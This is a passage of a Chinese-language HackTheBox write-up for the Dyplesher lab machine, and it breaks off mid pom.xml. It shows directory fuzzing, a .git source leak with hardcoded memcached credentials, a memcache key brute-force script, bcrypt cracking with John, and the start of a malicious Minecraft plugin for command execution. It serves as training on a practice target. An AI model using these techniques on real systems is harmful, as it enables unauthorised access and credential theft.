ffuf -u http:&#x2F;&#x2F;test.dyplesher.htb&#x2F;FUZZ -w &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt</span><br><span class="line"></span><br><span class="line">        &#x2F;&#39;___\  &#x2F;&#39;___\           &#x2F;&#39;___\       </span><br><span class="line">       &#x2F;\ \__&#x2F; &#x2F;\ \__&#x2F;  __  __  &#x2F;\ \__&#x2F;       </span><br><span class="line">       \ \ ,__\\ \ ,__\&#x2F;\ \&#x2F;\ \ \ \ ,__\      </span><br><span class="line">        \ \ \_&#x2F; \ \ \_&#x2F;\ \ \_\ \ \ \ \_&#x2F;      </span><br><span class="line">         \ \_\   \ \_\  \ \____&#x2F;  \ \_\       </span><br><span class="line">          \&#x2F;_&#x2F;    \&#x2F;_&#x2F;   \&#x2F;___&#x2F;    \&#x2F;_&#x2F;       </span><br><span class="line"></span><br><span class="line">       v1.0.2</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : http:&#x2F;&#x2F;test.dyplesher.htb&#x2F;FUZZ</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">                        [Status: 200, Size: 239, Words: 16, Lines: 15]</span><br><span class="line">.git&#x2F;HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]</span><br><span class="line">index.php               [Status: 200, Size: 239, Words: 16, Lines: 15]</span><br><span class="line">.htaccess               [Status: 403, Size: 283, Words: 20, Lines: 10]</span><br><span class="line">.htpasswd               [Status: 403, Size: 283, Words: 20, Lines: 10]</span><br><span class="line">.hta                    [Status: 403, Size: 283, Words: 20, Lines: 10]</span><br><span class="line">server-status           [Status: 403, Size: 283, Words: 20, Lines: 10]</span><br><span class="line">:: Progress: [4614&#x2F;4614] :: Job [1&#x2F;1] :: 1153 req&#x2F;sec :: Duration: [0:00:04] :: Errors: 0 ::</span><br></pre></td></tr></table></figure>

<p>发现<code>.git</code>泄露，利用<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a>下载泄露的源码，只有一个index.php文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~&#x2F;htb-tools&#x2F;GitHack ‹master*› </span><br><span class="line">╰─# python GitHack.py http:&#x2F;&#x2F;test.dyplesher.htb&#x2F;.git&#x2F;</span><br><span class="line">[+] Download and parse index file ...</span><br><span class="line">README.md</span><br><span class="line">index.php</span><br><span class="line">[OK] index.php</span><br><span class="line">[OK] README.md</span><br></pre></td></tr></table></figure>

<p>这个页面就是 <a href="http://test.dyplesher.htb" target="_blank" rel="noopener">http://test.dyplesher.htb</a> 页面的源码，会将<code>&lt;key, value&gt;</code>以键值对的方式添加到MemCache数据库中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;h1&gt;Add key <span class="keyword">and</span> value to memcache&lt;h1&gt;</span><br><span class="line">&lt;FORM METHOD=<span class="string">"GET"</span> NAME=<span class="string">"test"</span> ACTION=<span class="string">""</span>&gt;</span><br><span class="line">&lt;INPUT TYPE=<span class="string">"text"</span> NAME=<span class="string">"add"</span>&gt;</span><br><span class="line">&lt;INPUT TYPE=<span class="string">"text"</span> NAME=<span class="string">"val"</span>&gt;</span><br><span class="line">&lt;INPUT TYPE=<span class="string">"submit"</span> VALUE=<span class="string">"Send"</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'add'</span>] != $_GET[<span class="string">'val'</span>])&#123;</span><br><span class="line">        $m = <span class="keyword">new</span> Memcached();</span><br><span class="line">        $m-&gt;setOption(Memcached::OPT_BINARY_PROTOCOL, <span class="keyword">true</span>);</span><br><span class="line">        $m-&gt;setSaslAuthData(<span class="string">"felamos"</span>, <span class="string">"zxcvbnm"</span>);</span><br><span class="line">        $m-&gt;addServer(<span class="string">'127.0.0.1'</span>, <span class="number">11211</span>);</span><br><span class="line">        $m-&gt;add($_GET[<span class="string">'add'</span>], $_GET[<span class="string">'val'</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Done!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"its equal"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>

<p><code>Memcached::setSaslAuthData()</code>函数的作用是设置应用于与memcache服务器进行SASL身份验证的用户名和密码，从源码可知用户名是<code>felamos</code>，密码是<code>zxcvbnm</code>。  </p>
<h3 id="枚举Memcache键值对"><a href="#枚举Memcache键值对" class="headerlink" title="枚举Memcache键值对"></a>枚举Memcache键值对</h3><p>python3 安装<a href="https://pypi.org/project/python-binary-memcached/" target="_blank" rel="noopener">python-binary-memcached</a>模块：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install python-binary-memcached</span><br></pre></td></tr></table></figure>

<p>写了一个简单的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bmemcached</span><br><span class="line">client = bmemcached.Client((<span class="string">'10.10.10.190:11211'</span>, ), <span class="string">'felamos'</span>, <span class="string">'zxcvbnm'</span>)</span><br><span class="line">fp = open(<span class="string">'/usr/share/wordlists/rockyou.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">line = fp.readline().strip()</span><br><span class="line"><span class="keyword">while</span> line:</span><br><span class="line">    response = client.get(line)</span><br><span class="line">    <span class="keyword">if</span> response:</span><br><span class="line">        print(line + <span class="string">": "</span> + response)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    line = fp.readline().strip()</span><br><span class="line"></span><br><span class="line">fp.close()</span><br></pre></td></tr></table></figure>

<p>得到3个加密后的密码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">minato:$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa</span><br><span class="line">felamos:$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK</span><br><span class="line">yuntao:$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS</span><br></pre></td></tr></table></figure>

<p>另一种更方便的方式是使用<code>memcached-cli</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install npm</span><br><span class="line">npm install -g memcached-cli</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─# memcached-cli felamos:zxcvbnm@dyplesher.htb:11211</span><br><span class="line"></span><br><span class="line">dyplesher.htb:11211&gt; get username</span><br><span class="line">MinatoTW</span><br><span class="line">felamos</span><br><span class="line">yuntao</span><br><span class="line"></span><br><span class="line">dyplesher.htb:11211&gt; get password</span><br><span class="line">$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa</span><br><span class="line">$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK</span><br><span class="line">$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS</span><br></pre></td></tr></table></figure>

<p>丢到john里解密，得到用户felamos的密码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─# john hashes --wordlist=/root/htb-tools/wordlists/rockyou.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Loaded hashes with cost 1 (iteration count) varying from 1024 to 4096</span><br><span class="line">Press 'q' or Ctrl-C to abort, almost any other key for status</span><br><span class="line">mommy1           (felamos)</span><br></pre></td></tr></table></figure>

<p>用密码<code>felamos@dyplesher.htb : mommy1</code>尝试登录 <a href="http://dyplesher.htb/login" target="_blank" rel="noopener">http://dyplesher.htb/login</a> ，登录失败，再尝试登录gogs服务 <a href="http://dyplesher.htb:3000/user/login?redirect_to=" target="_blank" rel="noopener">http://dyplesher.htb:3000/user/login?redirect_to=</a> 登录成功。登录之后看到felamos用户是拥有两个Repositories，然后还提交了commit：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/12.png" alt="12"></p>
<p>在名为gitlab的仓库里发现了felamos发布的一个releases：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/13.png" alt="13"></p>
<h3 id="Git-Bundle"><a href="#Git-Bundle" class="headerlink" title="Git Bundle"></a>Git Bundle</h3><p>下载解压后是一个<code>repositories</code>文件夹，文件夹下有一些bundle文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/repositories </span><br><span class="line">╰─# tree</span><br><span class="line">.</span><br><span class="line">`-- @hashed</span><br><span class="line">    |-- 4b</span><br><span class="line">    |   `-- 22</span><br><span class="line">    |       `-- 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle</span><br><span class="line">    |-- 4e</span><br><span class="line">    |   `-- 07</span><br><span class="line">    |       |-- 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce</span><br><span class="line">    |       `-- 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle</span><br><span class="line">    |-- 6b</span><br><span class="line">    |   `-- 86</span><br><span class="line">    |       `-- 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle</span><br><span class="line">    `-- d4</span><br><span class="line">        `-- 73</span><br><span class="line">            `-- d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle</span><br><span class="line"></span><br><span class="line">10 directories, 4 files</span><br></pre></td></tr></table></figure>

<p>file命令查看这些bundle文件信息，这些bundle是git bundle：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/repositories </span><br><span class="line">╰─# file @hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle</span><br><span class="line">@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle: Git bundle</span><br></pre></td></tr></table></figure>

<p>git bundle是有用的线下仓库传输工具，在一些情况下，一个人很难直接git clone仓库（git clone很慢或是仓库过大），这个时候就可以通过bundle命令将git仓库打包，然后通过U盘或是其他方式进行传输。使用git clone来进行unbundle操作：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone @hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle</span><br><span class="line">git clone @hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle</span><br><span class="line">git clone @hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle</span><br><span class="line">git clone @hashed/d4/73/d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle</span><br></pre></td></tr></table></figure>

<p>查看有哪些文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/repositories# tree</span><br><span class="line">.</span><br><span class="line">|-- 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a</span><br><span class="line">|   |-- LICENSE</span><br><span class="line">|   |-- README.md</span><br><span class="line">|   `-- src</span><br><span class="line">|       `-- VoteListener.py</span><br><span class="line">|-- 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce</span><br><span class="line">|   |-- README.md</span><br><span class="line">|   |-- banned-ips.json</span><br><span class="line">|   |-- banned-players.json</span><br><span class="line">|   |-- bukkit.yml</span><br><span class="line">|   |-- commands.yml</span><br><span class="line">|   |-- craftbukkit-1.8.jar</span><br><span class="line">|   |-- eula.txt</span><br><span class="line">|   |-- help.yml</span><br><span class="line">|   |-- ops.json</span><br><span class="line">|   |-- permissions.yml</span><br><span class="line">|   |-- plugins</span><br><span class="line">|   |   |-- LoginSecurity</span><br><span class="line">|   |   |   |-- authList</span><br><span class="line">|   |   |   |-- config.yml</span><br><span class="line">|   |   |   `-- users.db</span><br><span class="line">|   |   |-- LoginSecurity.jar</span><br><span class="line">|   |   `-- PluginMetrics</span><br><span class="line">|   |       `-- config.yml</span><br><span class="line">|   |-- python</span><br><span class="line">|   |   `-- pythonMqtt.py</span><br><span class="line">|   |-- sc-mqtt.jar</span><br><span class="line">|   |-- server.properties</span><br><span class="line">|   |-- spigot-1.8.jar</span><br><span class="line">|   |-- start.command</span><br><span class="line">|   |-- usercache.json</span><br><span class="line">|   |-- whitelist.json</span><br><span class="line">|   |-- world</span><br><span class="line">|   |   |-- data</span><br><span class="line">|   |   |   |-- villages.dat</span><br><span class="line">|   |   |   `-- villages_end.dat</span><br><span class="line">|   |   |-- level.dat</span><br><span class="line">|   |   |-- level.dat_mcr</span><br><span class="line">|   |   |-- level.dat_old</span><br><span class="line">|   |   |-- playerdata</span><br><span class="line">|   |   |   `-- 18fb40a5-c8d3-4f24-9bb8-a689914fcac3.dat</span><br><span class="line">|   |   |-- region</span><br><span class="line">|   |   |   |-- r.-1.0.mca</span><br><span class="line">|   |   |   `-- r.0.0.mca</span><br><span class="line">|   |   |-- session.lock</span><br><span class="line">|   |   `-- uid.dat</span><br><span class="line">|   `-- world_the_end</span><br><span class="line">|       |-- DIM1</span><br><span class="line">|       |   `-- region</span><br><span class="line">|       |       |-- r.-1.-1.mca</span><br><span class="line">|       |       |-- r.-1.0.mca</span><br><span class="line">|       |       |-- r.0.-1.mca</span><br><span class="line">|       |       `-- r.0.0.mca</span><br><span class="line">|       |-- level.dat</span><br><span class="line">|       |-- level.dat_old</span><br><span class="line">|       |-- session.lock</span><br><span class="line">|       `-- uid.dat</span><br><span class="line">|-- 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b</span><br><span class="line">|   |-- LICENSE</span><br><span class="line">|   |-- README.md</span><br><span class="line">|   |-- phpbash.min.php</span><br><span class="line">|   `-- phpbash.php</span><br><span class="line">|-- @hashed</span><br><span class="line">|   |-- 4b</span><br><span class="line">|   |   `-- 22</span><br><span class="line">|   |       `-- 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle</span><br><span class="line">|   |-- 4e</span><br><span class="line">|   |   `-- 07</span><br><span class="line">|   |       |-- 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce</span><br><span class="line">|   |       `-- 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle</span><br><span class="line">|   |-- 6b</span><br><span class="line">|   |   `-- 86</span><br><span class="line">|   |       `-- 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle</span><br><span class="line">|   `-- d4</span><br><span class="line">|       `-- 73</span><br><span class="line">|           `-- d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle</span><br><span class="line">`-- d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35</span><br><span class="line">    |-- LICENSE.txt</span><br><span class="line">    |-- README.md</span><br><span class="line">    `-- nightminer.py</span><br><span class="line"></span><br><span class="line">26 directories, 54 files</span><br></pre></td></tr></table></figure>

<p>可以看到在<code>4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity</code>下有一个名为<code>users.db</code>的数据库文件。</p>
<p>用file命令查看发现是sqlite数据库文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/repositories/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity ‹master› </span><br><span class="line">╰─# file users.db</span><br><span class="line">users.db: SQLite 3.x database, last written using SQLite version 3027002</span><br></pre></td></tr></table></figure>

<p><code>.tables</code>命令查看数据表信息：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~/repositories/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity ‹master› </span><br><span class="line">╰─# sqlite3 users.db</span><br><span class="line">SQLite version 3.33.0 2020-08-14 13:23:32</span><br><span class="line">Enter ".help" for usage hints.</span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> .tables</span></span><br><span class="line">users</span><br></pre></td></tr></table></figure>

<p>设置<code>.header on</code>显示表头，不然会看得比较懵：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> .header on</span></span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> select * from users;</span></span><br><span class="line">unique_user_id|password|encryption|ip</span><br><span class="line">18fb40a5c8d34f249bb8a689914fcac3|$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6|7|/192.168.43.81</span><br></pre></td></tr></table></figure>

<p>有一串加密密码，利用john the ripper解密，得到<code>alexis1</code>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─# cat hash</span><br><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$10</span><span class="variable">$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6</span></span></span><br><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─# john hash --wordlist=/root/htb-tools/wordlists/rockyou.txt    </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 1024 for all loaded hashes</span><br><span class="line">Press 'q' or Ctrl-C to abort, almost any other key for status</span><br><span class="line">alexis1          (?)</span><br><span class="line">1g 0:00:00:56 DONE (2020-11-05 08:08) 0.01768g/s 28.06p/s 28.06c/s 28.06C/s alexis1..cameron1</span><br><span class="line">Use the "--show" option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>利用这个密码<code>felamos@dyplesher.htb : alexis1</code>登录 <a href="http://dyplesher.htb/login" target="_blank" rel="noopener">http://dyplesher.htb/login</a> :</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/14.png" alt="14"></p>
<p>左边的toolbar上有一些链接。</p>
<p>Console - <code>/home/console</code>：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/15.png" alt="15"></p>
<p>console界面上提示，<strong>Running Paper MC</strong>，Paper MC fork自Spigot，主要是修复Spigot的一些不足之处，Spigot是运行MineCraft服务器的一个软件，他跟官方出的服务器软件不一样的地方在于它可以为服务器装上一些插件，而且稳定性和负载性也比较好，同时也支持多服务器串联，现在的百人服务器也基本都是使用它来架设的。</p>
<p>Reload Plugin - <code>/home/reload</code>  ：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/18.png" alt="18"></p>
<p>加载/卸载用户自定义的插件。</p>
<p>Add Plugin - <code>/home/add</code>：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/19.png" alt="19"></p>
<p>上传用户插件，上传的用户需要通过reload来激活。</p>
<p>Delete Plugin - <code>/home/delete</code>：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/16.png" alt="16"></p>
<p>删除插件，但其实删不掉，不过我们可以查看当前正在运行的插件情况。</p>
<h3 id="制作MineCraft插件"><a href="#制作MineCraft插件" class="headerlink" title="制作MineCraft插件"></a>制作MineCraft插件</h3><p>先简要介绍下这个插件框架啥的。</p>
<p>既然felamos拥有上传插件和加载插件的权限，所以我们可以自己制作一些插件来运行系统命令，插件制作教程可以参考这篇文章<a href="https://www.spigotmc.org/wiki/creating-a-plugin-with-maven-using-intellij-idea/" target="_blank" rel="noopener">Creating a plugin with Maven using IntelliJ IDEA</a>。</p>
<p>制作插件需要：</p>
<ul>
<li><p>Intellij IDEA</p>
</li>
<li><p>JDK，在之前的/root/repositories/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce目录下，有个craftbukkit-1.8.jar，查看MANIFEST.MF文件就知道当前的jdk版本是1.8。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">╭─root@vultr ~&#x2F;repositories&#x2F;4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce ‹master*› </span><br><span class="line">╰─# ls  </span><br><span class="line">README.md            bukkit.yml           eula.txt  permissions.yml  sc-mqtt.jar        start.command   world</span><br><span class="line">banned-ips.json      commands.yml         help.yml  plugins          server.properties  usercache.json  world_the_end</span><br><span class="line">banned-players.json  craftbukkit-1.8.jar  ops.json  python           spigot-1.8.jar     whitelist.json</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/20.png" alt="20"></p>
<h4 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h4><p><code>File -&gt; New -&gt; Project</code>，新建项目，选择<code>Maven</code>，jdk版本选择1.8：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/21.png" alt="21"></p>
<p>然后填写GroupId和ArtifactId，也就是项目名：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/22.png" alt="22"></p>
<h4 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h4><p>新建好项目后，首先修改pom.xml文件来添加一些必要的依赖组件。因为要制作一个Spigot插件并且使用相关的API，通过修改pom.xml来引入这些包：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>spigot-repo<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://hub.spigotmc.org/nexus/content/repositories/snapshots/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span 